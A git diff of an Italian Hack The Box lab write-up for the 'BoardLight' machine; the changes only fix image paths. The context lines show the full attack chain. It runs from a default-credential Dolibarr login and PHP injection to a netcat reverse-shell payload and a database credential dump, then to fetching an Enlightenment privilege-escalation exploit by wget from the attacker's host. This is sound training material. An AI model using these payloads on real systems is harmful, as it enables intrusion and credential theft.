@@ -19,7 +19,7 @@ nmap -p- --min-rate 10000 -oA nmap_allport 10.129.231.37
 nmap -p 22,80 -sC -sV -oA nmap_detailed 10.129.231.37
 ```
 
-![nmap](images/nmap.png)
+![nmap](nmap.png)
 
 | Port | Service | Version |
 |------|---------|---------|
@@ -34,7 +34,7 @@ nmap -p 22,80 -sC -sV -oA nmap_detailed 10.129.231.37
 
 Visitando la porta 80 si trova una landing page per una società di consulenza cybersecurity. Il footer rivela il dominio `board.htb`.
 
-![homepage](images/boardlight-http-home.png)
+![homepage](boardlight-http-home.png)
 
 ```bash
 echo "10.129.231.37 board.htb" | sudo tee -a /etc/hosts
@@ -73,7 +73,7 @@ Niente di rilevante sul dominio principale — la superficie di attacco è `crm.
 
 Navigando su `http://crm.board.htb` si trova un pannello Dolibarr **17.0.0**.
 
-![Dolibarr login](images/admin-http.png)
+![Dolibarr login](admin-http.png)
 
 Login con credenziali di default: `admin / admin`.
 
@@ -93,7 +93,7 @@ Test RCE:
 <?PHP echo system("whoami");?>
 ```
 
-![command injection](images/command-injection.png)
+![command injection](command-injection.png)
 
 Output: `www-data` — RCE confermato.
 
@@ -110,11 +110,11 @@ Payload nel HTML source:
 <?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.32 4444 >/tmp/f");?>
 ```
 
-![reverse shell payload](images/reverse-shell.png)
+![reverse shell payload](reverse-shell.png)
 
 Shell ottenuta come `www-data`:
 
-![www-data](images/www-data.png)
+![www-data](www-data.png)
 
 ### Shell stabilization
 
@@ -135,7 +135,7 @@ export TERM=xterm
 cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
 ```
 
-![credentials](images/pass_exploit.png)
+![credentials](pass_exploit.png)
 
 ```
 $dolibarr_main_db_user='dolibarrowner';
@@ -149,7 +149,7 @@ cat /etc/passwd | grep bash
 # larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
 ```
 
-![/etc/passwd](images/user-larissa.png)
+![/etc/passwd](user-larissa.png)
 
 La password del DB è riutilizzata per l'utente di sistema.
 
@@ -174,7 +174,7 @@ cat ~/user.txt
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-![SUID binaries](images/perm.png)
+![SUID binaries](perm.png)
 
 Tra i risultati spicca:
 
@@ -191,7 +191,7 @@ enlightenment --version
 # Version: 0.23.1
 ```
 
-![enlightenment version](images/interest.png)
+![enlightenment version](interest.png)
 
 ### Vulnerability
 
@@ -210,11 +210,11 @@ wget http://10.10.14.32:8080/exploit.sh
 bash exploit.sh
 ```
 
-![privilege escalation](images/privilege_escalation.png)
+![privilege escalation](privilege_escalation.png)
 
 Shell root ottenuta:
 
-![root shell](images/root.png)
+![root shell](root.png)
 
 ### Root flag
 
@@ -222,7 +222,7 @@ Shell root ottenuta:
 cat /root/root.txt
 ```
 
-![root flag](images/root_flag.png)
+![root flag](root_flag.png)
 
 ---
 
